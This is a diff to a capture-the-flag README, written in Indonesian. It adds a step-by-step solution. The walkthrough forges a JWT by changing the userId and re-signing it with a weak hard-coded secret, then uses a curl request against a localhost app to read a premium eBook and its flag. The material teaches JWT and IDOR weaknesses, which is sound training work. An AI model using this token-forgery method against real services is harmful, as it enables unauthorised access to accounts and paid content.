@@ -72,8 +72,49 @@ Challenge ini dibuat hanya untuk edukasi dan simulasi keamanan siber. Jangan gun
 
 Peserta harus:
 
+1. Langkah 1: Dapatkan Token JWT Awal&#x20;
+<img src="./assets/ebook-1.png"></img>
+Contoh Response:
+```json
+{
+  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEwMDEsInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzE5NDI5NDAwLCJleHAiOjE3MTk0MzMwMDB9.4j5XW7zQl2HJYwLw7QXn2v8m6d9QkZcX6jK7vL1J3Ek"
+}
+```
+2. Langkah 2: Decode Token di jwt.io&#x20;
+<img src="./assets/ebook-2.png"></img>
+Lihat payload:
+```json
+{
+  "userId": 1001,
+  "role": "user",
+  "iat": 1719429400,
+  "exp": 1719433000
+}
+```
+3. Langkah 3: Modifikasi Token&#x20;
+<img src="./assets/ebook-3.png"></img>
+Ubah userId dari 1001 menjadi 9999 (pemilik eBook premium)
+Gunakan secret key insecure_secret_123 untuk signature baru
+Hasilkan token baru, contoh:
+```json
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjk5OTksInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzE5NDI5NDAwLCJleHAiOjE3MTk0MzMwMDB9.1qZ3vVJkXoQ2wY8hN7Rt6cTm1x9fKsLp5UqSdW0bO4Y
+```
 
-    
+4. Langkah 4: Akses eBook Premium
+<img src="./assets/ebook-4.png"></img>
+Gunakan token yang sudah dimodifikasi:
+```bash
+curl http://localhost:4000/api/ebooks/1337 \
+  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjk5OTksInJvbGUiOiJ1c2VyIiwiaWF0IjoxNzE5NDI5NDAwLCJleHAiOjE3MTk0MzMwMDB9.1qZ3vVJkXoQ2wY8hN7Rt6cTm1x9fKsLp5UqSdW0bO4Y"
+```
+Response Sukses:
+```json
+{
+  "title": "eBook Premium",
+  "content": "CTF_FLAG{JWT_IDOR_Pr3v3nt1on_1s_Key}",
+  "price": 50000
+}
+```
 </details>
 
 ---
